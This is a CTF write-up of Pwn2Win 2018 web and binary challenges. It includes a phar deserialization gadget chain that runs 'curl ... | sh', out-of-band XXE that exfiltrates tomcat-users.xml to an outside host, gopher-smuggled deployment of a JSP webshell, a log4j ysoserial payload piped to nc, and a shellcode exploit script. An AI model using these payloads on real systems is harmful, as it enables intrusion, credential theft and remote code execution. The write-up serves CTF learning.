# Pwn2Win CTF 2018

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20181130-pwn2winctf/) of this writeup.**


 - [Pwn2Win CTF 2018](#pwn2win-ctf-2018)
   - [Crypto](#crypto)
     - [Back to Bletchley Park](#back-to-bletchley-park)
     - [GCM](#gcm)
   - [Web](#web)
     - [Berg’s Club](#bergs-club)
       - [Identify The Function](#identify-the-function)
       - [RCE](#rce)
       - [Failed Attempts](#failed-attempts)
     - [Message Board I (File Inclusion)](#message-board-i-file-inclusion)
       - [Information Leak](#information-leak)
       - [XML or JSON?](#xml-or-json)
     - [Message Board II (RCE)](#message-board-ii-rce)
       - [Tomcat Manager](#tomcat-manager)
       - [Almighty Gopher](#almighty-gopher)
       - [Gopher Pitfall (Intended Solution 1)](#gopher-pitfall-intended-solution-1)
       - [jar (Possibly Intended Solution 2)](#jar-possibly-intended-solution-2)
       - [Failed Attempts](#failed-attempts-1)
     - [Message Board III (log server RCE)](#message-board-iii-log-server-rce)
       - [Failed Attempts](#failed-attempts-2)
   - [Exploit](#exploit)
     - [minishell](#minishell)
       - [Binary behavior](#binary-behavior)
       - [Register status](#register-status)
       - [Make memory writable again](#make-memory-writable-again)
       - [Shellcode to call read](#shellcode-to-call-read)
       - [Adjust bigger input size and call read again](#adjust-bigger-input-size-and-call-read-again)
       - [ORW and get flag](#orw-and-get-flag)


## Crypto

### Back to Bletchley Park

sasdf

[https://sasdf.cf/ctf/writeup/2018/pwn2win/rev/back_to_bletchley_park/](https://sasdf.cf/ctf/writeup/2018/pwn2win/rev/back_to_bletchley_park/)

### GCM

sasdf

[https://sasdf.cf/ctf/writeup/2018/pwn2win/crypto/GCM/](https://sasdf.cf/ctf/writeup/2018/pwn2win/crypto/GCM/)

## Web

### Berg’s Club

bookgin

In this challenge, we can upload a JPEG image to the server. We can also check the log page but it will return `monolog` is not prepared. Additionally, we can share this image to others. The share feature will check if the image exists or not. For instance:

```
# no error
http://200.136.252.42/share/uploads%2Fb7a41ed641bf590cec346e0bdede04a8.jpg

# return error
http://200.136.252.42/share/uploads%2Faaaaa

# no error
http://200.136.252.42/share/%2fetc%2fpasswd
```

#### Identify The Function

But one thing is interesting: it does not return an error if it's a directory:

```
# no error
http://200.136.252.42/share/uploads
```

Since we know the backend is PHP, we can try to profile the function. I guess is `file_exists` because of this bahavior below. The results from server side are exactly the same as `file_exists`.

```
php > var_dump(file_exists('/home/ubuntu/../ubuntu/../ubuntu'));
bool(true)
php > var_dump(file_exists('/home/ubuntu/../aaaaubuntu/../ubuntu'));
bool(false)
```

#### RCE

Ok, so we can upload an image, and the server side will use `file_exist` to check. How can we RCE?

Although we cannot simply upload a webshell, we are able to upload an image with almost arbitrary content. If we can deserialize this file, it's possible to get RCE. But how can we leverage `file_exist` to deserialize the image?

Here is a good example: how an innocuous `getimagesize()` function turns into [RCE](https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html). Also, one of [Orange Tsai's challenge](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017) in HITCON 2017 is also about unsafe `phar://` deserialization. Some even list several other [exploitable function](https://rdot.org/forum/showthread.php?t=4379) in PHP.

Therefore, the exploitation is invoking `file_exists("phar://EVIL_IMAGE_PATH")`. We use [PHPGGC](https://github.com/ambionics/phpggc) to create a Generic Gadget Chains. Since the server leaks the information of using monolog in the log tab, we use `Monolog/RCE1` payload here.

Modify `gadgetchains/Monolog/RCE/1/chain.php` because the file has to be JPEG image:

```php
<?php

namespace GadgetChain\Monolog;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '1.18 <= 1.23';
    public $vector = '__destruct';
    public $author = 'cf';

    public function generate(array $parameters)
    {   
        $a = new \Monolog\Handler\SyslogUdpHandler(
            new \Monolog\Handler\BufferHandler(
                ['current', 'system'],
                ['curl "240.240.240.240:1234" | sh', 'level' => null]
            )
        );
        unlink('pwn.phar');
        $p = new \Phar('pwn.phar', 0); 
        $p['file.txt'] = 'test';
        $p->setMetadata($a);
        $p->setStub("\xff\xd8\xff\xe0\x0a<?php __HALT_COMPILER(); ?>");
        return $a; 
    }   
}
```

Upload this JPEG image and get RCE by visiting `http://200.136.252.42/share/pher%3a%2f%2fIMAGE_PATH`.

The remote server's `nc` doesn't work so I have to use `curl` to get the flag:

```
curl 240.240.240.240:12345 -F "a=`cat /flag/flag 2>&1`"
```

#### Failed Attempts

- Upload a webshell via image uploading API
    - The server will rename the file, and it will also check the content to make sure it's JPG.
- Exploit `getimagesize()`?
    - If the server uses `getimagesize()` we can also inject `phar://IMAGE_PATH` to trigger the deserialization and RCE. Refer to [this](https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html). However I didn't try that because I have more confidence the server is using `file_exists` in the share API.

### Message Board I (File Inclusion)

This challenge consists of 3 flags. We need file inclusion to get the first flag.

In this challenge, we can create/delete/read a message using JSON format. There are already 3 notes in the server. They are related to XML ,gopher protocol and json respectively. It seems like a hint.

#### Information Leak

Let's first try to add a message but it's not a valid JSON format. We get this juicy error information (some are omitted):

```
javax.servlet.ServletException: Servlet execution threw an exception
java.lang.Error: Error: could not match input com.sun.jersey.json.impl.reader.JsonLexer.zzScanError(JsonLexer.java:491)
com.sun.jersey.json.impl.reader.JsonLexer.yylex(JsonLexer.java:736) 
com.sun.jersey.json.impl.reader.JsonXmlStreamReader.nextToken(JsonXmlStreamReader.java:160) 
com.sun.jersey.json.impl.reader.JsonXmlStreamReader.readNext(JsonXmlStreamReader.java:187) 
com.sun.jersey.json.impl.reader.JsonXmlStreamReader.readNext(JsonXmlStreamReader.java:178) 
com.sun.jersey.json.impl.reader.JsonXmlStreamReader.next(JsonXmlStreamReader.java:448) 
com.sun.xml.bind.v2.runtime.unmarshaller.StAXStreamConnector.bridge(StAXStreamConnector.java:197) 
com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal0(UnmarshallerImpl.java:366) 
com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal(UnmarshallerImpl.java:345) 
com.sun.jersey.json.impl.BaseJSONUnmarshaller.unmarshalJAXBElementFromJSON(BaseJSONUnmarshaller.java:108) 
com.sun.jersey.json.impl.BaseJSONUnmarshaller.unmarshalFromJSON(BaseJSONUnmarshaller.java:97) 
com.sun.jersey.json.impl.provider.entity.JSONRootElementProvider.readFrom(JSONRootElementProvider.java:125) 
com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:699) 

...

javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
```

The footer in the error page and the header of the server indicate the backend is `Apache Tomcat/6.0.26` + `Apache-Coyote/1.1`. The server uses `jersey` library to parse JSON. However, the class is named `JsonXmlStreamReader`. 

We know that in XML, there is a notorious vulnerability called [XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing). Maybe it's possible to include external entity in JSON?

After some Google, I found [this post from 2009](http://jersey.576304.n2.nabble.com/JSON-Unmarshalling-Issue-td3012889.html). I seems like the library will parse `$` and `@` symbol. You may refer to this [CVE](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/) exploiting this. 

In the [source code](https://github.com/jersey/jersey-old/blob/master/jersey-json/src/main/java/com/sun/jersey/json/impl/reader/JsonXmlStreamReader.java#L232-L255), the symbols indeed have special meanings in the library. However I didn't dive into this too deep.

#### XML or JSON?

Then I build the jersey server from [this example](https://www.javainterviewpoint.com/json-example-jersey-jackson/) to test the parser myself. In the example above, the `application/json` header needs to be explicitly set. I start to wonder what if I set to other type? And bingo! It works! The server will parse the request body according to the `content-type` header.

```
curl -X PUT '10.133.70.7:8080/rest/messages' -H 'Content-Type: application/xml; charset=utf-8' -d @mar2.xml -sD -
```

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>                                                                
<message>
<id>2</id>
<message>msg</message>
<title>xml</title>
</message>
```

Therefore that's try XXE:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>                                                             
<message>
<id></id>
<message>&xxe;</message>
<title>xml</title>
</message>
```

Note that XXE can also be used to list directory! `<!ENTITY xxe SYSTEM "file:///">]` will list all the file and directory on the root. The flag is in `/flag/flag`. `CTF-BR{TYPE_CONFUSION_ON_APIS_ARE_LOVELY_WITH_XXE_DONT_U_THINK??}`.

I think this is intended solution due to type confusion. It might also be possible to exploit the JSON parser (e.g. [CVE-2017-7525](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)).

Reference:
- [Sleepless in Salt Lake City: XML Injection](https://sleeplessinslc.blogspot.com/2010/09/xml-injection.html)
- [XML guide](https://xmlwriter.net/xml_guide/entity_declaration.shtml)

### Message Board II (RCE)

bookgin
Special thanks to the author [@pimps](https://github.com/pimps/)!

In the first stage, we can list the file in the root. There is a file named `root_pwd.txt`:`RCE_TO_PWN_ME`. Thus, in this stage we have to get shell and get root!

#### Tomcat Manager

The only ability currently we have is file inclusion. However, since XXE includes the file in XML, the whole xml has to be parsed to XML correctly. Otherwise it will return an error. For example, we cannot read html, xml or most binary file. They will break the whole XML structure.

In `/etc/passwd` we found the home directory of Apache tomcat 6.0 is in `/opt/tomcat`. In the directory and we found: the `manager` directory. That means we might be able to access [Apache Tomcat manager](https://tomcat.apache.org/tomcat-6.0-doc/manager-howto.html) interface. However, we got 403 forbidden visiting `/manager` because apprarently the server only accepts connection from localhost.

Don't forget the XXE support other protocols like HTTP and gopher (because of the hint in the message). Let's try to make a request from localhost and access the manager API.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/manager/list">]>                                                             
<message>
<id></id>
<message>&xxe;</message>
<title>xml</title>
</message>
```

Unfortunately we still got an error. It's because the web interface is protected by HTTP basic authentication. However, in this JAVA XXE, the HTTP protocol does not implement HTTP basic authentication. We cannot use `admin:password@localhost:8080` syntax to login. - We have to utilize gopher protocol!

Let's get the password first. The password is in `/opt/tomcat/conf/tomcat-users.xml`. However we cannot directly read this file because it will break the xml parser. We have to use [some clever technique](https://blog.zsec.uk/out-of-band-xxe-2/) to bypass this limitation - out-of-band.

```xml
<?xml version="1.0" ?>
<!DOCTYPE a [
<!ENTITY % asd SYSTEM "http://240.240.240.240:8080/xxe_file.dtd">
%asd;
%c;
]>
<message>
<id></id>
<message>&rrr;</message>
<title>xml</title>
</message>
```

`xxe_file.dtd`:

```xml
<!ENTITY % d SYSTEM "file:///opt/tomcat/conf/tomcat-users.xml">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://240.240.240.240:8082/?a=%d;'>">
```

Basically, it first includes the XML DTD, and then it reads the file. Instead of rendering in XML, it sends the file content to us through http protocol. That's why it's called out-of-band. Here is the password file of tomcat manager:

```xml
<tomcat-users>
  <role rolename="manager"/>
  <user name="admin" password="sup3rs3cr3tp4ssc0d3" roles="manager"/>
</tomcat-users>
```

#### Almighty Gopher

Since the HTTP protocol in this JAVA XML has no support of [HTTP basic authentication](https://en.wikipedia.org/wiki/Basic_access_authentication), we have to leverage gopher to make the following request:

```
GET /manager/list HTTP/1.1
Host: localhost:8080
Authorization: Basic YWRtaW46c3VwM3JzM2NyM3RwNHNzYzBkMw==
Connection: close
```

1. The `host` header is necessary. Otherwise Apache server will return an error.
2. `Connection: close` is essential. By default gopher protocol doesn't close the connection. This will make the whole connection hang. Therefore we should ask the server side to close the connection.

Simply use URL encoding (percent-encoding) to insert CRLF.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
<!ENTITY rrr SYSTEM "gopher://localhost:8080/_GET%20/manager/list%20HTTP/1.1%0d%0aHost%3a%20localhost%3a8080%0d%0aAuthorization%3A%20Basic%20YWRtaW46c3VwM3JzM2NyM3RwNHNzYzBkMw%3D%3D%0d%0aConnection%3a%20close%0d%0a">
]>
<message>
<id></id>
<message>&rrr;</message>
<title>dd</title>
</message>
```

And our payload works! The server will return a list of applications.

#### Gopher Pitfall (Intended Solution 1)

In Tomcat manager, we can [deploy an application remotely](https://tomcat.apache.org/tomcat-6.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely). Therefore our plan is to utilize gopher to smuggle the HTTP protocol, and deploy a malicious application!

I install a Tomcat docker locally to see the payload of the HTTP request. When deploying an application remotely, the browser will send a HTTP PUT request.

```
PUT /manager/deploy?path=/_ HTTP/1.1
Host: localhost:8080
Content-Length: 1234
Authorization: Basic YWRtaW46c3VwM3JzM2NyM3RwNHNzYzBkMw==
Connection: close

[WAR application]
```

In order to create a malicious WAR application and deploy to Tomcat, I found a great [Tomcat backdoor example](https://github.com/mgeeky/tomcatWarDeployer). Here is another [official example](https://tomcat.apache.org/tomcat-6.0-doc/appdev/sample/) of a Tomcat WAR application. In fact, we can omit `WEB-INF/web.xml` and `META-INF` directory and files. Just creating a `.war` file with `index.jsp` is enough. Additionally, both `jar -cvf` and `zip` can create a valid WAR application.

Here is my damn-small webshell `index.jsp`. Then `zip -r pwn.war index.jsp` this file.

```
<%!
void f(String k) throws java.io.IOException{
  Runtime.getRuntime().exec(k == null ? "true": k);
}
%>
<% f(request.getParameter("_")); %>
```

Note: Actually you can use a common webshell, but I found when the POST body is more than 1200 bytes, the connection will time out. I think it's due to the firewall, since pwn2win CTF uses some VPN isolated environment for this challenge. After I get the shell of the remote machine and I try to download some other files from my computer, the connection will timeout once the file size is more than 1200 bytes approximately. Thus I have to split the file into small pieces......

 ow we can just mimic the request using gopher. Unfortunately, the JAVA XXE gopher protocol doesn't support all the non-ascii characters. Any character above than `%7f` will lead to some problems. gopher will append some `\xc2` `\xc3` ...... In BlackHat 2012, SSRF VS. Business by Polyakov et al. mentioned this behevior. Refer to the [slide P.71](https://media.blackhat.com/bh-us-12/Briefings/Polyakov/aBH_US_12_Polyakov_SSRF_Business_Slides.pdf) and [paper P.25](https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_WP.pdf). Thanks to @pimps for letting me know that.
 
>The symbols from 7A to 88 in hex were changed by gopher to the `?` symbol.

However, @pimps creates a amazing tool [gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer) to create a zip file in ASCII range (0x00-0x7f):

1. Timestamp: simply set it to a time in ASCII range
2. CRC32: just append whitespace in the uncompresseed file and try to recompute again

Finally, the payload: 

```
<%!void f(String k)throws java.io.IOException{Runtime.getRuntime().exec(k==null?"true":k);}%><%f(request.getParameter("_"));%>

gopher://localhost:8080/_PUT%20/manager/deploy%3Fpath%3D/_%20HTTP/1.1%0D%0AHost%3A%20localhost%3A8080%0D%0AContent-Length%3A%20183%0D%0AAuthorization%3A%20Basic%20YWRtaW46c3VwM3JzM2NyM3RwNHNzYzBkMw%3D%3D%0D%0AConnection%3A%20close%0D%0A%0D%0APK%03%04%14%00%00%00%00%00%00%00%21%00Z%7D%03%1EK%00%00%00K%00%00%00%05%00%00%00c.jsp%3C%25Runtime.getRuntime%28%29.exec%28request.getParameter%28%22_%22%29%29%3B%25%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20PK%01%02%14%03%14%00%00%00%00%00%00%00%21%00Z%7D%03%1EK%00%00%00K%00%00%00%05%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00c.jspPK%05%06%00%00%00%00%01%00%01%003%00%00%00n%00%00%00%00%00
```

Then visit `http://10.133.70.7:8080/_/c.jsp?_=curl MYIP` to get RCE. I don't know why the bash reverse shell doesn't work, so I use python revere shell with [pty](https://evertpot.com/189/). Simply run `su -` with password `RCE_TO_PWN_ME` to get the flag in `/root`!

`CTF-BR{{W00T_RCE???_ALL_HAIL_TO_GOPHER_THE_BEAVER_OF_PWNAGE}` . There is an extra `{` in the flag.

#### jar (Possibly Intended Solution 2)

In the tomcat manager doc, it supports [deploy WAR application from a local file](https://tomcat.apache.org/tomcat-6.0-doc/manager-howto.html#Deploy_a_Directory_or_WAR_by_URL). If we can somehow upload a malicious WAR file to the server, we can deploy the application using `file:/PATH`.

In fact, JAVA XXE also supports `jar:` protocol. Refer to [XML Schema, DTD, and Entity Attacks P.15 - 17](https://www.vsecurity.com/download/publications/XMLDTDEntityAttacks.pdf) by Timothy D. Morgan (@ecbftw). 

> The attack works by sending an initial request which asks Xerces to fetch a jar URL from a web server controlled by
the attacker.  Java downloads this file to a designated temporary directory using a randomly selected file name.

Since we can include any file in the server, it's easy to locate the temporary JAR file in `/opt/tomcat/temp`. One can leverage this technique to create temporary WAR file, and the use `deploy?war=file:/opt/tomcat/temp/...` to upload the backdoor.

I didn't try this but I can see the temporary file in `/opt/tomcat/temp`. It's likely this challenge can also be solved in this way.

#### Failed Attempts

- Bypass gopher replacement
    - Percent-encoding doesn't work because gopher will replace it. Sending raw byte doesn't work either due to XML parsing failure.
    - XML escape characters `#&x60;` doesn't work either.
    - Utilize XML encode. Maybe we can find a encoding supporting raw byte?
- Deploy application using HTTP
    - Because in the document, the war is described as a `java.net.JarURLConnection` class. This class should support HTTP so I tried this `deploy?war=http://` , `deploy?war=jar:http://` but none of them works.
    

### Message Board III (log server RCE)

The step 3 is to pwn the Apache log4j server in LAN. Let's first retrieve some information:

- `/etc/hosts`: We see this line `10.133.70.13 log4jserver.local`
- `log4j2.properties`: Sorry I forget the exact path. The file is in somewhere in `/opt/tomcat`:
```
log4j.rootLogger=DEBUG, server 
# to connect to the remote server 
log4j.appender.server=org.apache.log4j.net.SocketAppender  
# set set that layout to be SimpleLayout 
log4j.appender.server.layout=org.apache.log4j.SimpleLayout   
log4j.appender.server.RemoteHost=log4jserver.local
log4j.appender.server.Port=1337
```

Also, the log4jserver has firewalls. It can only communicate with this server of the challenge.

Google `log4j rce`. We found [CVE-2017-5645](https://github.com/pimps/CVE-2017-5645).

```
java -jar ysoserial-modified.jar CommonsCollections6 bash 'find / | nc 10.133.70.7 1234' > payload

# upload the payload to the challenge server
cat payload | nc log4jserver.local 1337
```

Get the flag easily! `CTF-BR{<3<3<3_SERIALIZATION_IS_LOVE_<3<3<3}`

#### Failed Attempts
- Send the payload using gopher because I haven't solved step 2 first
    - I contact to the organizers and they said I need to solve step 2 first. 
    - The payload contains non-ascii bytes which gopher will replace them......
    - The payload is more than 1200 bytes......


## Exploit

### minishell

#### Binary behavior
* Call `mmap` a memory with `RWX` permission
* Ask for at most 12 bytes input
* Call `mprotect` to remove `W` permission from that mmap memory
* Jump to that memory and execute your shellcode

#### Register status

```
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff78baae7 (<mprotect+7>:      cmp    rax,0xfffffffffffff001)
RDX: 0x5 
RSI: 0x1000 
RDI: 0x7ffff7ff7000 (mov    al,0xa)
RBP: 0x7fffffffe580 --> 0x555555554cf0 (push   r15)
RSP: 0x7fffffffe560 --> 0x7fffffffe668 --> 0x7fffffffe853 ("./minishell")
RIP: 0x7ffff7ff7000 (mov    al,0xa)
R8 : 0x555555757b30 --> 0x555555757c30 --> 0x0 
R9 : 0x0 
R10: 0x1 
R11: 0x202 
R12: 0x5555555549b0 (xor    ebp,ebp)
R13: 0x7fffffffe660 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
```

* Notice that `RDI` is address of the mmap memory

#### Make memory writable again

As the `W` permission has already been removed, we need to call `mprotect` to make the memory writable again. Luckily most of the registers are already well set, we just need to adjust `RAX` and `RDX`.

`mprotect(void *addr, size_t len, int prot)`
* `RDI` is already set to address of mmap memory
* `RSI` can be any value
* `RDX` should be `7`
* `RAX` should be `0xa`

Shellcode (6 bytes):
```
    mov al, 0xa
    mov dl, 0x7
    syscall
```

#### Shellcode to call read

After calling `mprotect`, the register status become:

```
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7ff7006 --> 0xf8eb5e5f5051
RDX: 0x7
RSI: 0x1000
RDI: 0x7ffff7ff7000 --> 0x5051050f07b20ab0
RBP: 0x7fffffffe580 --> 0x555555554cf0 (push   r15)
RSP: 0x7fffffffe560 --> 0x7fffffffe668 --> 0x7fffffffe853 ("./minishell")
RIP: 0x7ffff7ff7006 --> 0xf8eb5e5f5051
R8 : 0x555555757b30 --> 0x555555757c30 --> 0x0
R9 : 0x0
R10: 0x1
R11: 0x317
R12: 0x5555555549b0 (xor    ebp,ebp)
R13: 0x7fffffffe660 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
```

`read(int fd, void *buf, size_t count)`
* `RDI` should be `0`
* `RSI` should be the address of mmap memory
* `RDX` can be any value
* `RAX` is already set to `0`

We have 6 bytes left to call `read`. We need at least 4 bytes to control the register `RDI` and `RSI`, also 2 bytes for `syscall`, so we can only read 7 bytes if we execute the following shellcode (6 bytes):

```
    push rdi
    push rax
    pop rdi
    pop rsi
    syscall
```

However, we can't execute the next shellcode because `RIP` is not set to `RSI`. Notice that `RCX` is the address after calling `syscall` in our previous shellcode, if we set `RSI` to `RCX` and jump back to `syscall`, we can continue execute our new shellcode.

Here is the shellcode (12 bytes):

```
    mov al, 0xa
    mov dl, 0x7
_syscall:
    syscall
    push rcx
    push rax
    pop rdi
    pop rsi
    jmp _syscall
```

#### Adjust bigger input size and call read again 

The rest is pretty straightforward, as `RDI` and `RSI` are already set, we just need to change `RDX` to a bigger value to read our ORW shellcode.

Shellcode (6 bytes):
```
    mov al, 0
    mov dl, 0xff
    syscall
```

#### ORW and get flag

Exploit:

```
#!/usr/bin/env python

import sys
from pwn import *

context.arch = 'amd64'

host = '200.136.252.34'
port = 4545

if len(sys.argv) == 1:
    r = process('./minishell')
else:
    r = remote(host, port)

raw_input('#')
r.recvuntil('So what? ')

# mprotect(mmap_addr, len, PROC_RWX)
# read(0, mmap_addr+offset, 7)
sc = """
    mov al, 0xa
    mov dl, 0x7
    L20:
    syscall
    push rcx
    push rax
    pop rdi
    pop rsi
    jmp L20
    """

sc = asm(sc)
r.send(sc)
sleep(0.5)

# read(0, mmap_addr+offset, 0xff)
sc = """
    mov al, 0
    mov dl, 0xff
    syscall
    """

r.send(asm(sc))
sleep(0.5)

# open('/home/minishell/flag.txt')
# read(fd[rax], buf, 0x30)
# write(1, buf, 0x30)
# exit()
sc = """
    mov rax, 2
    mov rdi, rsi
    add rdi, 83
    mov rsi, 0
    mov rdx, 0
    syscall
    mov rsi, rdi
    mov rdi, rax
    mov rax, 0
    mov rdx, 0x30
    syscall
    mov rax, 1
    mov rdi, 1
    syscall
    mov rax, 60
    syscall
    """

r.sendline('AAAAAA' + asm(sc) + '/home/minishell/flag.txt\x00')
r.interactive()
```

Flag: `CTF-BR{s0000_t1ght_f0r_my_B1G_sh3ll0dE_}`

